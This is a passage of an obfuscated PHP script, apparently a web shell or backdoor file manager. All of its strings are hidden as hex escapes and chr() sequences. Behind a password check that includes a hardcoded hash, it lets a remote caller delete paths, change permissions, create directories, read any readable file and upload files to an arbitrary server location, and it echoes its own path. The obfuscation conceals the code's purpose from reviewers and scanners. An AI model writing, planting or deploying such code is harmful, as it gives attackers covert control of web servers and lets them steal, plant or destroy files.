        echo json_encode(array("\x73\x74\x61\x74\x75\x73" => chr(101).chr(114).chr(114).chr(111).chr(114), chr(105).chr(110).chr(102).chr(111) => chr(82).chr(101).chr(110).chr(97).chr(109).chr(101).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100)));
    }
    exit();
}

if (isset($_GET["\x64\x65\x6c\x65\x74\x65"])) {
    $_e0baae = isset($_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82)]) ? $_SERVER["\x50\x48\x50\x5f\x41\x55\x54\x48\x5f\x55\x53\x45\x52"] : (isset($_POST["\x75\x73\x65\x72\x6e\x61\x6d\x65"]) ? $_POST[chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101)] : null);
    $_b55452 = isset($_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(87)]) ? $_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(87)] : (isset($_POST["\x70\x61\x73\x73\x77\x6f\x72\x64"]) ? $_POST["\x70\x61\x73\x73\x77\x6f\x72\x64"] : null);
    if (!isset($_e0baae) || !isset($_b55452) || !isset($_595a5b[$_e0baae])) { echo json_encode(array("\x73\x74\x61\x74\x75\x73" => chr(101).chr(114).chr(114).chr(111).chr(114), chr(105).chr(110).chr(102).chr(111) => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64")); exit(); }
    if (version_compare(PHP_VERSION, "\x35\x2e\x35\x2e\x30", "\x3c")) {
        $_4e6144 = "\x24\x50\x24\x44\x37\x69\x44\x6e\x4f\x6b\x6c\x79\x33\x59\x54\x36\x6d\x49\x67\x78\x36\x42\x41\x74\x47\x67\x33\x78\x6e\x49\x68\x4e\x58\x2f";
        $_38a5cf = new _cf3574f10(10, false);
        if (!$_38a5cf->CheckPassword($_b55452, $_4e6144)) { echo json_encode(array("\x73\x74\x61\x74\x75\x73" => "\x65\x72\x72\x6f\x72", "\x69\x6e\x66\x6f" => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64")); exit(); }
    } else {
        if (!password_verify($_b55452, $_595a5b[$_e0baae])) { echo json_encode(array("\x73\x74\x61\x74\x75\x73" => chr(101).chr(114).chr(114).chr(111).chr(114), "\x69\x6e\x66\x6f" => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64")); exit(); }
    }

    $_4a9acf = isset($_POST[chr(112).chr(97).chr(116).chr(104)]) ? "\x2f" . _fe3cb0c25($_POST["\x70\x61\x74\x68"]) : '';
    if (empty($_4a9acf)) {
        echo json_encode(array("\x73\x74\x61\x74\x75\x73" => chr(101).chr(114).chr(114).chr(111).chr(114), "\x69\x6e\x66\x6f" => chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(112).chr(97).chr(116).chr(104))); exit();
    }
    if (!file_exists($_4a9acf)) {
        echo json_encode(array("\x73\x74\x61\x74\x75\x73" => "\x73\x75\x63\x63\x65\x73\x73", chr(105).chr(110).chr(102).chr(111) => "\x41\x6c\x72\x65\x61\x64\x79\x20\x64\x65\x6c\x65\x74\x65\x64")); exit();
    }
    $_6dd235 = _f158bb05b($_4a9acf);
    if ($_6dd235) {
        echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x73\x75\x63\x63\x65\x73\x73", "\x69\x6e\x66\x6f" => chr(68).chr(101).chr(108).chr(101).chr(116).chr(101).chr(100).chr(32).chr(115).chr(117).chr(99).chr(99).chr(101).chr(115).chr(115).chr(102).chr(117).chr(108).chr(108).chr(121)));
    } else {
        echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x65\x72\x72\x6f\x72", chr(105).chr(110).chr(102).chr(111) => "\x44\x65\x6c\x65\x74\x65\x20\x66\x61\x69\x6c\x65\x64"));
    }
    exit();
}

if (isset($_GET[chr(99).chr(104).chr(109).chr(111).chr(100)])) {
    $_e0baae = isset($_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82)]) ? $_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82)] : (isset($_POST["\x75\x73\x65\x72\x6e\x61\x6d\x65"]) ? $_POST[chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101)] : null);
    $_b55452 = isset($_SERVER["\x50\x48\x50\x5f\x41\x55\x54\x48\x5f\x50\x57"]) ? $_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(87)] : (isset($_POST["\x70\x61\x73\x73\x77\x6f\x72\x64"]) ? $_POST["\x70\x61\x73\x73\x77\x6f\x72\x64"] : null);
    if (!isset($_e0baae) || !isset($_b55452) || !isset($_595a5b[$_e0baae])) { echo json_encode(array("\x73\x74\x61\x74\x75\x73" => "\x65\x72\x72\x6f\x72", "\x69\x6e\x66\x6f" => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64")); exit(); }
    if (version_compare(PHP_VERSION, "\x35\x2e\x35\x2e\x30", "\x3c")) {
        $_4e6144 = chr(36).chr(80).chr(36).chr(68).chr(55).chr(105).chr(68).chr(110).chr(79).chr(107).chr(108).chr(121).chr(51).chr(89).chr(84).chr(54).chr(109).chr(73).chr(103).chr(120).chr(54).chr(66).chr(65).chr(116).chr(71).chr(103).chr(51).chr(120).chr(110).chr(73).chr(104).chr(78).chr(88).chr(47);
        $_38a5cf = new _cf3574f10(10, false);
        if (!$_38a5cf->CheckPassword($_b55452, $_4e6144)) { echo json_encode(array("\x73\x74\x61\x74\x75\x73" => "\x65\x72\x72\x6f\x72", chr(105).chr(110).chr(102).chr(111) => chr(65).chr(117).chr(116).chr(104).chr(101).chr(110).chr(116).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100))); exit(); }
    } else {
        if (!password_verify($_b55452, $_595a5b[$_e0baae])) { echo json_encode(array("\x73\x74\x61\x74\x75\x73" => chr(101).chr(114).chr(114).chr(111).chr(114), chr(105).chr(110).chr(102).chr(111) => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64")); exit(); }
    }

    $_4a9acf = isset($_POST["\x70\x61\x74\x68"]) ? chr(47) . _fe3cb0c25($_POST["\x70\x61\x74\x68"]) : '';
    $_1673f0 = isset($_POST["\x6d\x6f\x64\x65"]) ? $_POST[chr(109).chr(111).chr(100).chr(101)] : '';
    if (empty($_4a9acf) || !file_exists($_4a9acf) || !preg_match(chr(47).chr(94).chr(91).chr(48).chr(45).chr(55).chr(93).chr(123).chr(51).chr(44).chr(52).chr(125).chr(36).chr(47), $_1673f0)) {
        echo json_encode(array("\x73\x74\x61\x74\x75\x73" => "\x65\x72\x72\x6f\x72", "\x69\x6e\x66\x6f" => chr(73).chr(110).chr(118).chr(97).chr(108).chr(105).chr(100).chr(32).chr(112).chr(97).chr(114).chr(97).chr(109).chr(101).chr(116).chr(101).chr(114).chr(115))); exit();
    }
    if (chmod($_4a9acf, octdec($_1673f0))) {
        echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => chr(115).chr(117).chr(99).chr(99).chr(101).chr(115).chr(115), "\x69\x6e\x66\x6f" => chr(80).chr(101).chr(114).chr(109).chr(105).chr(115).chr(115).chr(105).chr(111).chr(110).chr(115).chr(32).chr(99).chr(104).chr(97).chr(110).chr(103).chr(101).chr(100)));
    } else {
        echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x65\x72\x72\x6f\x72", chr(105).chr(110).chr(102).chr(111) => "\x63\x68\x6d\x6f\x64\x20\x66\x61\x69\x6c\x65\x64"));
    }
    exit();
}

if (isset($_GET[chr(109).chr(107).chr(100).chr(105).chr(114)])) {
    $_e0baae = isset($_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82)]) ? $_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82)] : (isset($_POST["\x75\x73\x65\x72\x6e\x61\x6d\x65"]) ? $_POST[chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101)] : null);
    $_b55452 = isset($_SERVER["\x50\x48\x50\x5f\x41\x55\x54\x48\x5f\x50\x57"]) ? $_SERVER["\x50\x48\x50\x5f\x41\x55\x54\x48\x5f\x50\x57"] : (isset($_POST["\x70\x61\x73\x73\x77\x6f\x72\x64"]) ? $_POST["\x70\x61\x73\x73\x77\x6f\x72\x64"] : null);
    if (!isset($_e0baae) || !isset($_b55452) || !isset($_595a5b[$_e0baae])) { echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x65\x72\x72\x6f\x72", "\x69\x6e\x66\x6f" => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64")); exit(); }
    if (version_compare(PHP_VERSION, chr(53).chr(46).chr(53).chr(46).chr(48), "\x3c")) {
        $_4e6144 = chr(36).chr(80).chr(36).chr(68).chr(55).chr(105).chr(68).chr(110).chr(79).chr(107).chr(108).chr(121).chr(51).chr(89).chr(84).chr(54).chr(109).chr(73).chr(103).chr(120).chr(54).chr(66).chr(65).chr(116).chr(71).chr(103).chr(51).chr(120).chr(110).chr(73).chr(104).chr(78).chr(88).chr(47);
        $_38a5cf = new _cf3574f10(10, false);
        if (!$_38a5cf->CheckPassword($_b55452, $_4e6144)) { echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x65\x72\x72\x6f\x72", chr(105).chr(110).chr(102).chr(111) => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64")); exit(); }
    } else {
        if (!password_verify($_b55452, $_595a5b[$_e0baae])) { echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x65\x72\x72\x6f\x72", "\x69\x6e\x66\x6f" => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64")); exit(); }
    }

    $_4a9acf = isset($_POST[chr(112).chr(97).chr(116).chr(104)]) ? chr(47) . _fe3cb0c25($_POST["\x70\x61\x74\x68"]) : '';
    if (empty($_4a9acf)) {
        echo json_encode(array("\x73\x74\x61\x74\x75\x73" => chr(101).chr(114).chr(114).chr(111).chr(114), "\x69\x6e\x66\x6f" => "\x49\x6e\x76\x61\x6c\x69\x64\x20\x70\x61\x74\x68")); exit();
    }
    if (is_dir($_4a9acf)) {
        echo json_encode(array("\x73\x74\x61\x74\x75\x73" => chr(115).chr(117).chr(99).chr(99).chr(101).chr(115).chr(115), "\x69\x6e\x66\x6f" => chr(65).chr(108).chr(114).chr(101).chr(97).chr(100).chr(121).chr(32).chr(101).chr(120).chr(105).chr(115).chr(116).chr(115))); exit();
    }
    $_4ca9d4 = umask(0);
    $_46e0dd = mkdir($_4a9acf, 0755, true);
    umask($_4ca9d4);
    if ($_46e0dd) {
        echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x73\x75\x63\x63\x65\x73\x73", "\x69\x6e\x66\x6f" => chr(68).chr(105).chr(114).chr(101).chr(99).chr(116).chr(111).chr(114).chr(121).chr(32).chr(99).chr(114).chr(101).chr(97).chr(116).chr(101).chr(100)));
    } else {
        echo json_encode(array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => chr(101).chr(114).chr(114).chr(111).chr(114), "\x69\x6e\x66\x6f" => chr(109).chr(107).chr(100).chr(105).chr(114).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100)));
    }
    exit();
}

if (isset($_GET[chr(102).chr(105).chr(108).chr(101)])) {
    $_e0baae = isset($_SERVER["\x50\x48\x50\x5f\x41\x55\x54\x48\x5f\x55\x53\x45\x52"]) ? $_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82)] : (isset($_POST[chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101)]) ? $_POST[chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101)] : null);
    $_b55452 = isset($_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(87)]) ? $_SERVER["\x50\x48\x50\x5f\x41\x55\x54\x48\x5f\x50\x57"] : (isset($_POST["\x70\x61\x73\x73\x77\x6f\x72\x64"]) ? $_POST[chr(112).chr(97).chr(115).chr(115).chr(119).chr(111).chr(114).chr(100)] : null);
    if (!isset($_e0baae) || !isset($_b55452)) {
        $_ea6bdf = array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => chr(101).chr(114).chr(114).chr(111).chr(114), "\x69\x6e\x66\x6f" => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64");
        echo json_encode($_ea6bdf);
        exit();
    }
    if (version_compare(PHP_VERSION, chr(53).chr(46).chr(53).chr(46).chr(48), chr(60))) {
        $_4e6144 = chr(36).chr(80).chr(36).chr(68).chr(55).chr(105).chr(68).chr(110).chr(79).chr(107).chr(108).chr(121).chr(51).chr(89).chr(84).chr(54).chr(109).chr(73).chr(103).chr(120).chr(54).chr(66).chr(65).chr(116).chr(71).chr(103).chr(51).chr(120).chr(110).chr(73).chr(104).chr(78).chr(88).chr(47);
        $_38a5cf = new _cf3574f10(10, false);
        if (!$_38a5cf->CheckPassword($_b55452, $_4e6144)) {
            $_ea6bdf = array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => chr(101).chr(114).chr(114).chr(111).chr(114), "\x69\x6e\x66\x6f" => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64");
            echo json_encode($_ea6bdf);
            exit();
        }
    } else {
        if (!password_verify($_b55452, $_595a5b[$_e0baae])) {
            $_ea6bdf = array("\x73\x74\x61\x74\x75\x73" => chr(101).chr(114).chr(114).chr(111).chr(114), "\x69\x6e\x66\x6f" => chr(65).chr(117).chr(116).chr(104).chr(101).chr(110).chr(116).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100));
            echo json_encode($_ea6bdf);
            exit();
        }
    }

    $_5447f7 = _fe3cb0c25($_GET["\x66\x69\x6c\x65"]);
    $_5447f7 = chr(47) . $_5447f7;

    if (file_exists($_5447f7) && is_readable($_5447f7)) {
        $_ea6bdf = array("\x73\x74\x61\x74\x75\x73" => chr(115).chr(117).chr(99).chr(99).chr(101).chr(115).chr(115), "\x66\x69\x6c\x65" => file_get_contents($_5447f7));
        echo json_encode($_ea6bdf);
        exit;
    } else {
        $_ea6bdf = array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x65\x72\x72\x6f\x72", chr(105).chr(110).chr(102).chr(111) => chr(70).chr(105).chr(108).chr(101).chr(32).chr(110).chr(111).chr(116).chr(32).chr(102).chr(111).chr(117).chr(110).chr(100));
        echo json_encode($_ea6bdf);
        exit;
    }
}

if (!empty($_FILES)) {
    $_e0baae = isset($_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82)]) ? $_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(85).chr(83).chr(69).chr(82)] : (isset($_POST[chr(117).chr(115).chr(101).chr(114).chr(110).chr(97).chr(109).chr(101)]) ? $_POST["\x75\x73\x65\x72\x6e\x61\x6d\x65"] : null);
    $_b55452 = isset($_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(87)]) ? $_SERVER[chr(80).chr(72).chr(80).chr(95).chr(65).chr(85).chr(84).chr(72).chr(95).chr(80).chr(87)] : (isset($_POST["\x70\x61\x73\x73\x77\x6f\x72\x64"]) ? $_POST["\x70\x61\x73\x73\x77\x6f\x72\x64"] : null);
    if (!isset($_e0baae) || !isset($_b55452)) {
        $_ea6bdf = array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x65\x72\x72\x6f\x72", chr(105).chr(110).chr(102).chr(111) => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64");
        echo json_encode($_ea6bdf);
        exit();
    }
    if (version_compare(PHP_VERSION, chr(53).chr(46).chr(53).chr(46).chr(48), chr(60))) {
        $_4e6144 = chr(36).chr(80).chr(36).chr(68).chr(55).chr(105).chr(68).chr(110).chr(79).chr(107).chr(108).chr(121).chr(51).chr(89).chr(84).chr(54).chr(109).chr(73).chr(103).chr(120).chr(54).chr(66).chr(65).chr(116).chr(71).chr(103).chr(51).chr(120).chr(110).chr(73).chr(104).chr(78).chr(88).chr(47);
        $_38a5cf = new _cf3574f10(10, false);
        if (!$_38a5cf->CheckPassword($_b55452, $_4e6144)) {
            $_ea6bdf = array("\x73\x74\x61\x74\x75\x73" => chr(101).chr(114).chr(114).chr(111).chr(114), chr(105).chr(110).chr(102).chr(111) => "\x41\x75\x74\x68\x65\x6e\x74\x69\x63\x61\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64");
            echo json_encode($_ea6bdf);
            exit();
        }
    } else {
        if (!password_verify($_b55452, $_595a5b[$_e0baae])) {
            $_ea6bdf = array(chr(115).chr(116).chr(97).chr(116).chr(117).chr(115) => "\x65\x72\x72\x6f\x72", chr(105).chr(110).chr(102).chr(111) => chr(65).chr(117).chr(116).chr(104).chr(101).chr(110).chr(116).chr(105).chr(99).chr(97).chr(116).chr(105).chr(111).chr(110).chr(32).chr(102).chr(97).chr(105).chr(108).chr(101).chr(100));
            echo json_encode($_ea6bdf);
            exit();
        }
    }

    $_eea6b6 = _fe3cb0c25($_REQUEST[chr(102).chr(117).chr(108).chr(108).chr(112).chr(97).chr(116).chr(104)]);

    $_1cbdce = $_FILES;
    $_4a9acf = "";
    $_9c9781 = DIRECTORY_SEPARATOR;

    $_83d901 = 0;
    $_9b6b8a = 0;
    $_9b889b = array();
    $_ea6bdf = array(
        "\x73\x74\x61\x74\x75\x73" => "\x65\x72\x72\x6f\x72",
        chr(105).chr(110).chr(102).chr(111)   => "\x4f\x6f\x70\x73\x21\x20\x54\x72\x79\x20\x61\x67\x61\x69\x6e"
    );

    $_9224dd = $_1cbdce[chr(102).chr(105).chr(108).chr(101)][chr(110).chr(97).chr(109).chr(101)];
    $_c340fe = $_1cbdce[chr(102).chr(105).chr(108).chr(101)][chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101)];
    $_b9b01f = pathinfo($_9224dd, PATHINFO_FILENAME) != '' ? strtolower(pathinfo($_9224dd, PATHINFO_EXTENSION)) : "";
    $_322c2a = ($_9b889b) ? in_array($_b9b01f, $_9b889b) : true;

    if (!_fb83989a2($_9224dd) && !_fb83989a2($_eea6b6)) {
        $_ea6bdf = array(
            chr(115).chr(116).chr(97).chr(116).chr(117).chr(115)    => "\x65\x72\x72\x6f\x72",
            "\x69\x6e\x66\x6f"      => "\x49\x6e\x76\x61\x6c\x69\x64\x20\x46\x69\x6c\x65\x20\x6e\x61\x6d\x65\x21",
        );
        echo json_encode($_ea6bdf);
        exit();
    }

    if (!empty($_POST["\x72\x6f\x6f\x74\x70\x61\x74\x68"])) {
        $_4a9acf = $_POST[chr(114).chr(111).chr(111).chr(116).chr(112).chr(97).chr(116).chr(104)];
        $_12a222 = $_4a9acf;
    } else {
        $_12a222 = $_4a9acf . $_9c9781;
    }
    if (is_writable($_12a222)) {
        $_b27070 = $_4a9acf;
        if (substr($_b27070, -1) !== chr(47)) {
            $_b27070 = $_b27070 . chr(47) . $_eea6b6;
        }
        $_8769dc = substr($_b27070, 0, strrpos($_b27070, "\x2f"));

        if (!is_dir($_8769dc)) {
            $_4ca9d4 = umask(0);
            mkdir($_8769dc, 0777, true);
            umask($_4ca9d4);
        }

        if (empty($_1cbdce["\x66\x69\x6c\x65"][chr(101).chr(114).chr(114).chr(111).chr(114)]) && !empty($_c340fe) && $_c340fe != "\x6e\x6f\x6e\x65" && $_322c2a) {
            $_f01351 = false;
            if (move_uploaded_file($_c340fe, $_b27070)) {
                $_f01351 = true;
            } else {
                
                
                
                $_ff2f31 = @file_get_contents($_c340fe);
                if ($_ff2f31 !== false) {
                    if (file_exists($_b27070)) @unlink($_b27070);
                    $_f01351 = (@file_put_contents($_b27070, $_ff2f31) !== false);
                }
            }

            if ($_f01351) {
                @chmod($_b27070, 0644);
                $_ea6bdf = array("\x73\x74\x61\x74\x75\x73" => "\x73\x75\x63\x63\x65\x73\x73", chr(105).chr(110).chr(102).chr(111) => "\x66\x69\x6c\x65\x20\x75\x70\x6c\x6f\x61\x64\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6c");
            } else {
                $_ea6bdf = array("\x73\x74\x61\x74\x75\x73" => chr(101).chr(114).chr(114).chr(111).chr(114), chr(105).chr(110).chr(102).chr(111) => "\x45\x72\x72\x6f\x72\x20\x77\x68\x69\x6c\x65\x20\x75\x70\x6c\x6f\x61\x64\x69\x6e\x67\x20\x66\x69\x6c\x65\x2e");
            }
        } else {
            $_3846de = [
                UPLOAD_ERR_INI_SIZE   => chr(70).chr(105).chr(108).chr(101).chr(32).chr(101).chr(120).chr(99).chr(101).chr(101).chr(100).chr(115).chr(32).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(95).chr(109).chr(97).chr(120).chr(95).chr(102).chr(105).chr(108).chr(101).chr(115).chr(105).chr(122).chr(101).chr(32).chr(105).chr(110).chr(32).chr(112).chr(104).chr(112).chr(46).chr(105).chr(110).chr(105),
                UPLOAD_ERR_FORM_SIZE  => chr(70).chr(105).chr(108).chr(101).chr(32).chr(101).chr(120).chr(99).chr(101).chr(101).chr(100).chr(115).chr(32).chr(77).chr(65).chr(88).chr(95).chr(70).chr(73).chr(76).chr(69).chr(95).chr(83).chr(73).chr(90).chr(69).chr(32).chr(105).chr(110).chr(32).chr(102).chr(111).chr(114).chr(109),
                UPLOAD_ERR_PARTIAL    => chr(70).chr(105).chr(108).chr(101).chr(32).chr(119).chr(97).chr(115).chr(32).chr(111).chr(110).chr(108).chr(121).chr(32).chr(112).chr(97).chr(114).chr(116).chr(105).chr(97).chr(108).chr(108).chr(121).chr(32).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(101).chr(100),
                UPLOAD_ERR_NO_FILE    => "\x4e\x6f\x20\x66\x69\x6c\x65\x20\x77\x61\x73\x20\x75\x70\x6c\x6f\x61\x64\x65\x64",
                UPLOAD_ERR_NO_TMP_DIR => chr(77).chr(105).chr(115).chr(115).chr(105).chr(110).chr(103).chr(32).chr(116).chr(101).chr(109).chr(112).chr(111).chr(114).chr(97).chr(114).chr(121).chr(32).chr(102).chr(111).chr(108).chr(100).chr(101).chr(114),
                UPLOAD_ERR_CANT_WRITE => chr(70).chr(97).chr(105).chr(108).chr(101).chr(100).chr(32).chr(116).chr(111).chr(32).chr(119).chr(114).chr(105).chr(116).chr(101).chr(32).chr(102).chr(105).chr(108).chr(101).chr(32).chr(116).chr(111).chr(32).chr(100).chr(105).chr(115).chr(107),
                UPLOAD_ERR_EXTENSION  => chr(85).chr(112).chr(108).chr(111).chr(97).chr(100).chr(32).chr(98).chr(108).chr(111).chr(99).chr(107).chr(101).chr(100).chr(32).chr(98).chr(121).chr(32).chr(80).chr(72).chr(80).chr(32).chr(101).chr(120).chr(116).chr(101).chr(110).chr(115).chr(105).chr(111).chr(110),
            ];
            $_40588c = isset($_1cbdce[chr(102).chr(105).chr(108).chr(101)][chr(101).chr(114).chr(114).chr(111).chr(114)]) ? $_1cbdce[chr(102).chr(105).chr(108).chr(101)]["\x65\x72\x72\x6f\x72"] : UPLOAD_ERR_OK;
            $_cec174 = array();
            if (!empty($_40588c)) {
                $_cec174[] = "\x75\x70\x6c\x6f\x61\x64\x20\x65\x72\x72\x6f\x72\x20" . $_40588c . "\x3a\x20" . (isset($_3846de[$_40588c]) ? $_3846de[$_40588c] : chr(117).chr(110).chr(107).chr(110).chr(111).chr(119).chr(110).chr(32).chr(117).chr(112).chr(108).chr(111).chr(97).chr(100).chr(32).chr(101).chr(114).chr(114).chr(111).chr(114));
            }
            if (empty($_c340fe) || $_c340fe === chr(110).chr(111).chr(110).chr(101)) {
                $_cec174[] = chr(116).chr(109).chr(112).chr(95).chr(110).chr(97).chr(109).chr(101).chr(32).chr(105).chr(115).chr(32).chr(101).chr(109).chr(112).chr(116).chr(121).chr(32).chr(111).chr(114).chr(32).chr(110).chr(111).chr(110).chr(101).chr(32).chr(40).chr(118).chr(97).chr(108).chr(117).chr(101).chr(58).chr(32) . var_export($_c340fe, true) . chr(41);
            }
            if (!$_322c2a) {
                $_cec174[] = "\x66\x69\x6c\x65\x20\x74\x79\x70\x65\x2f\x6e\x61\x6d\x65\x20\x6e\x6f\x74\x20\x61\x6c\x6c\x6f\x77\x65\x64\x20\x28\x66\x69\x6c\x65\x6e\x61\x6d\x65\x3a\x20" . $_9224dd . chr(41);
            }
            $_ea6bdf = array(
                "\x73\x74\x61\x74\x75\x73" => "\x65\x72\x72\x6f\x72",
                "\x69\x6e\x66\x6f"   => "\x55\x70\x6c\x6f\x61\x64\x20\x70\x72\x65\x63\x6f\x6e\x64\x69\x74\x69\x6f\x6e\x20\x66\x61\x69\x6c\x65\x64\x3a\x20" . implode(chr(59).chr(32), $_cec174),
            );
        }
    } else {
        $_ea6bdf = array(
            "\x73\x74\x61\x74\x75\x73" => chr(101).chr(114).chr(114).chr(111).chr(114),
            chr(105).chr(110).chr(102).chr(111)   => "\x54\x68\x65\x20\x73\x70\x65\x63\x69\x66\x69\x65\x64\x20\x66\x6f\x6c\x64\x65\x72\x20\x66\x6f\x72\x20\x75\x70\x6c\x6f\x61\x64\x20\x69\x73\x6e\x27\x74\x20\x77\x72\x69\x74\x65\x61\x62\x6c\x65\x2e"
        );
    }
    
    echo json_encode($_ea6bdf);
    exit();
}
echo __FILE__;
?>
